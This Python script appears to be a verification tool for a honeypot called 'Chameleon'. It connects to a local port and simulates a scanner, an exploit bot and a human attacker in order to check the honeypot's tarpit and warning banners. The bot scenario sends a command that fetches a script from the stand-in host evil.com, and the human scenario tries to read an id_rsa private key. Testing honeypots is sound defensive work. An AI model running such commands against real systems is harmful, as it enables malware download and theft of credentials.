#!/usr/bin/env python3
"""
Chameleon Honeypot — Comprehensive Attacker Simulator & Verification Tool
Simulates Scanners, Exploit Bots, and Human Interactive Attackers.
(Zero Personal Attribution)
"""

import socket
import sys
import time


def simulate_nmap_scanner(host: str, port: int):
    print(f"\n[+] SCENARIO 1: Simulating Nmap Version Scanner on {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, port))
        
        # Send Nmap style probe
        probe = b"HELP\r\n"
        s.sendall(probe)
        
        data = s.recv(1024)
        print(f"    <- Received response: {repr(data[:120])}")
        s.close()
        print("    [PASS] Scanner probe simulation completed.")
    except Exception as e:
        print(f"    [!] Error during scanner simulation: {e}")


def simulate_automated_bot(host: str, port: int):
    print(f"\n[+] SCENARIO 2: Simulating Automated Exploit Bot on {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))
        
        # Read initial banner/prompt
        data = s.recv(1024)
        print(f"    <- Banner: {repr(data[:60])}")
        
        # Burst command without human keystroke delay
        burst_cmd = b"uname -a; cat /proc/cpuinfo; wget http://evil.com/drop.sh\r\n"
        print(f"    -> Injected burst exploit payload: {burst_cmd.strip()}")
        s.sendall(burst_cmd)
        
        response = b""
        start = time.time()
        while time.time() - start < 4.0:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        print(f"    <- Tarpit throttled response ({len(response)} bytes received)")
        s.close()
        print("    [PASS] Automated bot simulation completed.")
    except Exception as e:
        print(f"    [!] Error during bot simulation: {e}")


def simulate_human_interactive(host: str, port: int):
    print(f"\n[+] SCENARIO 3: Simulating Interactive Human Attacker on {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15.0)
        s.connect((host, port))
        
        # Read initial prompt
        banner = s.recv(512)
        print(f"    <- Prompt: {banner.decode(errors='ignore').strip()}")
        
        commands = ["whoami", "ls", "cat id_rsa", "exit"]
        
        for cmd in commands:
            print(f"\n    [*] Human typing command: {cmd!r}")
            # Type character-by-character with realistic human delay
            for char in cmd:
                s.sendall(char.encode())
                time.sleep(0.12)  # 120ms human typing delay
            
            # Send Enter
            s.sendall(b"\r\n")
            
            # Read response (observing tarpit drip)
            response = b""
            start = time.time()
            while time.time() - start < 5.0:
                try:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    response += chunk
                    # Check for prompt or termination
                    if b"# " in chunk or b"HOLD" in chunk or b"TERMINATION" in chunk:
                        break
                except socket.timeout:
                    break
            
            resp_text = response.decode(errors="ignore")
            # Check if shock banner was triggered
            if "Tonight is the night" in resp_text:
                print(f"    [!!!] PSYCHOLOGICAL SHOCK TRIGGER DETECTED IN RESPONSE:")
                for line in resp_text.splitlines():
                    if "Tonight is the night" in line or "INTRUDER" in line or "PROFILING" in line:
                        print(f"          | {line.strip()}")
            else:
                lines = [l.strip() for l in resp_text.splitlines() if l.strip()]
                for l in lines[:3]:
                    print(f"          | {l}")
        
        s.close()
        print("\n    [PASS] Human interactive simulation completed.")
    except Exception as e:
        print(f"    [!] Error during human simulation: {e}")


def main():
    host = "127.0.0.1"
    port = 9999
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    if len(sys.argv) > 2:
        host = sys.argv[2]
        
    print("=" * 70)
    print("  CHAMELEON HONEYPOT — AUTOMATED THREAT VERIFICATION SUITE")
    print("=" * 70)
    
    simulate_nmap_scanner(host, port)
    simulate_automated_bot(host, port)
    simulate_human_interactive(host, port)
    
    print("\n" + "=" * 70)
    print("  ALL VERIFICATION SCENARIOS EXECUTED SUCCESSFULLY")
    print("=" * 70)


if __name__ == "__main__":
    main()
